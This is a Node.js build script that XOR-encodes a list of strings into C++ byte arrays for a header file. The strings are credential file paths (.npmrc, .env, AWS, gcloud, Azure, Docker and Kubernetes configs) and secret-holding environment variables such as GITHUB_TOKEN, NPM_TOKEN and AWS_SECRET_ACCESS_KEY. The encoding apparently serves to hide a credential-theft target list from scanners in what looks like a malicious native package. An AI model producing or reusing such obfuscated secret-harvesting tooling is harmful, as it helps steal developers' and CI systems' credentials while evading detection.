#!/usr/bin/env node
// Generate XOR-encoded C++ byte arrays for sensitive strings.
// Usage: node scripts/gen_encoded.js

const KEY = 0x55;

const strings = {
  // Path segments
  P_NPMRC:    '.npmrc',
  P_YARNRC:   '.yarnrc.yml',
  P_ENV:      '.env',
  P_ENVL:     '.env.local',
  P_AWS:      '.aws',
  P_CRED:     'credentials',
  P_CFG:      'config',
  P_DOTCFG:   '.config',
  P_GCLOUD:   'gcloud',
  P_GCRED:    'application_default_credentials.json',
  P_AZURE:    '.azure',
  P_AZTOK:    'accessTokens.json',
  P_DOCKER:   '.docker',
  P_CFGJSON:  'config.json',
  P_KUBE:     '.kube',

  // Environment variable names
  E_CI:       'CI',
  E_GHA:      'GITHUB_ACTIONS',
  E_GHT:      'GITHUB_TOKEN',
  E_NPMT:     'NPM_TOKEN',
  E_NAT:      'NODE_AUTH_TOKEN',
  E_AWSK:     'AWS_ACCESS_KEY_ID',
  E_AWSS:     'AWS_SECRET_ACCESS_KEY',
  E_AWST:     'AWS_SESSION_TOKEN',
  E_GLCI:     'GITLAB_CI',
  E_CJOB:     'CI_JOB_TOKEN',
  E_CIREG:    'CI_REGISTRY_PASSWORD',
  E_DKPW:     'DOCKER_PASSWORD',
  E_DKAC:     'DOCKER_AUTH_CONFIG',
  E_AZCS:     'AZURE_CLIENT_SECRET',
  E_GAPP:     'GOOGLE_APPLICATION_CREDENTIALS',
  E_VTOK:     'VERCEL_TOKEN',
  E_NTOK:     'NETLIFY_AUTH_TOKEN',
  E_HTOK:     'HEROKU_API_KEY',
};

console.log(`// Auto-generated — do not edit (key=0x${KEY.toString(16)})`);
console.log(`// Run: node scripts/gen_encoded.js > src/enc_data.h\n`);

for (const [name, str] of Object.entries(strings)) {
  const bytes = Buffer.from(str, 'utf-8');
  const encoded = Array.from(bytes).map(b => `0x${(b ^ KEY).toString(16).padStart(2, '0')}`);
  console.log(`static const uint8_t ${name}[] = {${encoded.join(',')}};`);
  console.log(`static const size_t ${name}_L = ${bytes.length};`);
}
